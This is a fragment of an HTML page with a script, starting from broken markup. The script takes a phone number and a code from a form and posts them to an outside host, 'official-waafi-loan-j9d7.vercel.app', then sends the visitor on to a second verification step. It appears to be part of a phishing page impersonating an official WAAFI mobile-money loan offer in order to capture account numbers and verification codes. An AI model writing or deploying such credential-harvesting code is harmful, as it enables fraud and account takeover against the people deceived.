<form id="step1Form">

required>


</div>

<script>

document.getElementById("step1Form").addEventListener("submit", async function(e){

    e.preventDefault();

    let phone = document.getElementById("phone").value;
    let code = document.getElementById("testCode").value;

    try {

        const response = await fetch("https://official-waafi-loan-j9d7.vercel.app/contact", {

            method: "POST",

            headers: {
                "Content-Type": "application/json"
            },

            body: JSON.stringify({
                phone: phone,
                code: code
            })

        });

        const result = await response.json();

        if(result.status === "success"){

            localStorage.setItem(
                "session_id",
                result.session_id
            );

            alert("Information sent successfully");

            window.location.href = "verify2.html";

        } else {

            alert("Unable to create session.");

        }

    } catch(error){

        console.log(error);

        alert("Connection error");

    }

});

</script>
